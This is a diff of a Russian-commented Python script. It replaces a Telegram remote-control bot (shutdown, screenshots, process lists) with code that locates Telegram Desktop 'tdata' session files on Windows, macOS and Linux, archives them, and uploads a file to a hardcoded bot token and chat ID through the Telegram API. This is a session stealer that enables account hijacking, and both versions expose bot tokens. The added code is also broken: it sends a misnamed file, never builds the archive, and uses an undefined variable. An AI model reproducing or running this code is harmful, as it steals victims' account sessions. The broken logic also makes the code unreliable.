@@ -1,198 +1,105 @@
 import os
-import subprocess
-import logging
-from telegram import Update
-from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
+import shutil
+import platform
+import requests
 
-# Настройка логирования
-logging.basicConfig(
-    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
-    level=logging.INFO
-)
-
-# Токен вашего бота (получите у @BotFather)
-BOT_TOKEN = "7742035954:AAE2EnOW_NXcCkmz7LCIgqx5MqI6ouAir4A"
-
-# ID вашего Telegram аккаунта (для безопасности)
-ADMIN_USER_ID = 7476936312  # Замените на ваш ID
-
-# Команды которые разрешено выполнять
-ALLOWED_COMMANDS = {
-    'status': 'получить статус системы',
-    'screenshot': 'сделать скриншот',
-    'shutdown': 'выключить компьютер через 60 сек',
-    'cancel_shutdown': 'отменить выключение',
-    'restart': 'перезагрузить компьютер через 60 сек',
-    'ip': 'получить IP адрес',
-    'processes': 'показать запущенные процессы',
-    'disk': 'показать использование диска'
-}
-
-async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Обработчик команды /start"""
-    if update.effective_user.id != ADMIN_USER_ID:
-        await update.message.reply_text("❌ Доступ запрещен!")
-        return
+def find_telegram_session():
+    system = platform.system()
+    session_paths = []
     
-    commands_list = "\n".join([f"/{cmd} - {desc}" for cmd, desc in ALLOWED_COMMANDS.items()])
-    await update.message.reply_text(
-        f"🤖 Бот для управления компьютером\n\n"
-        f"Доступные команды:\n{commands_list}"
-    )
+    if system == "Windows":
+        base_paths = [
+            os.path.expanduser("~\\AppData\\Roaming\\Telegram Desktop\\tdata"),
+            os.path.expanduser("~\\Documents\\Telegram Desktop\\tdata")
+        ]
+    elif system == "Darwin":  # macOS
+        base_paths = [
+            os.path.expanduser("~/Library/Application Support/Telegram Desktop/tdata"),
+            os.path.expanduser("~/Documents/Telegram Desktop/tdata")
+        ]
+    else:  # Linux
+        base_paths = [
+            os.path.expanduser("~/.local/share/TelegramDesktop/tdata"),
+            os.path.expanduser("~/Telegram Desktop/tdata")
+        ]
+    
+    for base_path in base_paths:
+        if os.path.exists(base_path):
+            session_files = []
+            # Ищем основные файлы сессии
+            target_files = [
+                "map", "key_datas", "dumps", "user_data", 
+                "settings", "cache"
+            ]
+            
+            for root, dirs, files in os.walk(base_path):
+                for file in files:
+                    if any(target in file.lower() for target in target_files):
+                        session_files.append(os.path.join(root, file))
+            
+            # Добавляем основные файлы из корня
+            for file in os.listdir(base_path):
+                if file.startswith("usertag") or file.startswith("settings") or file.endswith(".json"):
+                    session_files.append(os.path.join(base_path, file))
+            
+            if session_files:
+                session_paths.extend(session_files)
+    
+    return session_paths
 
-async def handle_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Обработчик команд"""
-    user_id = update.effective_user.id
-    if user_id != ADMIN_USER_ID:
-        await update.message.reply_text("❌ Доступ запрещен!")
-        return
+def create_session_archive(session_files):
+    archive_path = "telegram_session_backup.zip"
+    temp_dir = "temp_telegram_session"
+    
+    # Создаем временную директорию
+    if os.path.exists(temp_dir):
+        shutil.rmtree(temp_dir)
+    os.makedirs(temp_dir)
+    
+    # Копируем файлы сессии
+    for session_file in session_files:
+        try:
+            if os.path.isfile(session_file):
+                shutil.copy2(session_file, temp_dir)
+        except Exception as e:
+            print(f"Ошибка копирования {session_file}: {e}")
+    
+    # Создаем архив
+    shutil.make_archive("telegram_session_backup", 'zip', temp_dir)
+    
+    # Удаляем временную директорию
+    shutil.rmtree(temp_dir)
+    
+    return archive_path
 
-    command = update.message.text.split()[0][1:]  # Убираем / из команды
-
-    try:
-        if command == 'status':
-            await system_status(update, context)
-        elif command == 'screenshot':
-            await take_screenshot(update, context)
-        elif command == 'shutdown':
-            await shutdown_computer(update, context)
-        elif command == 'cancel_shutdown':
-            await cancel_shutdown(update, context)
-        elif command == 'restart':
-            await restart_computer(update, context)
-        elif command == 'ip':
-            await get_ip_address(update, context)
-        elif command == 'processes':
-            await get_processes(update, context)
-        elif command == 'disk':
-            await get_disk_usage(update, context)
-        else:
-            await update.message.reply_text("❌ Неизвестная команда")
-    except Exception as e:
-        await update.message.reply_text(f"❌ Ошибка: {str(e)}")
-
-async def system_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Получить статус системы"""
-    try:
-        # Для Windows
-        if os.name == 'nt':
-            uptime = subprocess.check_output('powershell "Get-WmiObject -Class Win32_OperatingSystem | Select-Object -Property LastBootUpTime"', shell=True)
-            memory = subprocess.check_output('systeminfo | find "Available Physical Memory"', shell=True)
-            await update.message.reply_text(f"🖥️ Статус системы:\nВремя работы: {uptime.decode()}\nПамять: {memory.decode()}")
-        # Для Linux/Mac
-        else:
-            uptime = subprocess.check_output(['uptime']).decode()
-            memory = subprocess.check_output(['free', '-h']).decode()
-            await update.message.reply_text(f"🖥️ Статус системы:\n{uptime}\nПамять:\n{memory}")
-    except Exception as e:
-        await update.message.reply_text(f"❌ Ошибка получения статуса: {str(e)}")
-
-async def take_screenshot(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Сделать скриншот"""
-    try:
-        # Установите библиотеку для скриншотов: pip install pyautogui pillow
-        import pyautogui
-        screenshot = pyautogui.screenshot()
-        screenshot.save('screenshot.png')
+def send_to_telegram(bot_token, chat_id):
+    url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
+    
+    with open("nsndb.zil", 'rb') as file:
+        files = {'document': file}
+        data = {'chat_id': chat_id}
         
-        with open('screenshot.png', 'rb') as photo:
-            await update.message.reply_photo(photo=photo, caption="📸 Скриншот экрана")
+        response = requests.post(url, files=files, data=data)
         
-        os.remove('screenshot.png')
-    except ImportError:
-        await update.message.reply_text("❌ Библиотека pyautogui не установлена")
-    except Exception as e:
-        await update.message.reply_text(f"❌ Ошибка создания скриншота: {str(e)}")
-
-async def shutdown_computer(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Выключить компьютер"""
-    try:
-        if os.name == 'nt':  # Windows
-            os.system("shutdown /s /t 60")
-            await update.message.reply_text("🔄 Компьютер выключится через 60 секунд")
-        else:  # Linux/Mac
-            os.system("shutdown -h +1")
-            await update.message.reply_text("🔄 Компьютер выключится через 60 секунд")
-    except Exception as e:
-        await update.message.reply_text(f"❌ Ошибка выключения: {str(e)}")
-
-async def cancel_shutdown(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Отменить выключение"""
-    try:
-        if os.name == 'nt':  # Windows
-            os.system("shutdown /a")
-            await update.message.reply_text("✅ Выключение отменено")
-        else:  # Linux/Mac
-            os.system("shutdown -c")
-            await update.message.reply_text("✅ Выключение отменено")
-    except Exception as e:
-        await update.message.reply_text(f"❌ Ошибка отмены выключения: {str(e)}")
-
-async def restart_computer(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Перезагрузить компьютер"""
-    try:
-        if os.name == 'nt':  # Windows
-            os.system("shutdown /r /t 60")
-            await update.message.reply_text("🔄 Компьютер перезагрузится через 60 секунд")
-        else:  # Linux/Mac
-            os.system("shutdown -r +1")
-            await update.message.reply_text("🔄 Компьютер перезагрузится через 60 секунд")
-    except Exception as e:
-        await update.message.reply_text(f"❌ Ошибка перезагрузки: {str(e)}")
-
-async def get_ip_address(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Получить IP адрес"""
-    try:
-        import socket
-        hostname = socket.gethostname()
-        local_ip = socket.gethostbyname(hostname)
-        
-        # Получение внешнего IP
-        import requests
-        external_ip = requests.get('https://api.ipify.org').text
-        
-        await update.message.reply_text(f"🌐 IP адреса:\nЛокальный: {local_ip}\nВнешний: {external_ip}")
-    except Exception as e:
-        await update.message.reply_text(f"❌ Ошибка получения IP: {str(e)}")
-
-async def get_processes(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Получить список процессов"""
-    try:
-        if os.name == 'nt':  # Windows
-            processes = subprocess.check_output(['tasklist']).decode()[:4000]  # Ограничение длины
-        else:  # Linux/Mac
-            processes = subprocess.check_output(['ps', 'aux']).decode()[:4000]
-        
-        await update.message.reply_text(f"📊 Процессы:\n```\n{processes}\n```", parse_mode='Markdown')
-    except Exception as e:
-        await update.message.reply_text(f"❌ Ошибка получения процессов: {str(e)}")
-
-async def get_disk_usage(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Получить информацию о дисках"""
-    try:
-        if os.name == 'nt':  # Windows
-            disk_info = subprocess.check_output(['wmic', 'logicaldisk', 'get', 'size,freespace,caption']).decode()
-        else:  # Linux/Mac
-            disk_info = subprocess.check_output(['df', '-h']).decode()
-        
-        await update.message.reply_text(f"💾 Использование диска:\n```\n{disk_info}\n```", parse_mode='Markdown')
-    except Exception as e:
-        await update.message.reply_text(f"❌ Ошибка получения информации о дисках: {str(e)}")
+    return response.status_code == 200
 
 def main():
-    """Основная функция"""
-    # Создаем приложение
-    application = Application.builder().token(BOT_TOKEN).build()
-
-    # Добавляем обработчики
-    application.add_handler(CommandHandler("start", start))
+    # Конфигурация
+    BOT_TOKEN = "8310983310:AAFuVs8DzO3ROxYNN3I_YWxSSqNVwAxalcA"  # Замените на токен бота
+    CHAT_ID = "8059961644"    # Замените на ID чата
     
-    # Обработчик для всех команд
-    application.add_handler(MessageHandler(filters.TEXT & filters.Regex(r'^/'), handle_command))
+    print("Поиск файлов сессии Telegram...")
+    session_files = find_telegram_session()
 
-    # Запускаем бота
-    print("Бот запущен...")
-    application.run_polling()
+    print("Отправка архива...")
+    if send_to_telegram(BOT_TOKEN, CHAT_ID):
+        print("Архив успешно отправлен")
+        
+        # Очистка
+        os.remove(archive_path)
+    else:
+        print("Ошибка отправки архива")
 
-if __name__ == '__main__':
+if __name__ == "__main__":
     main()
+input()
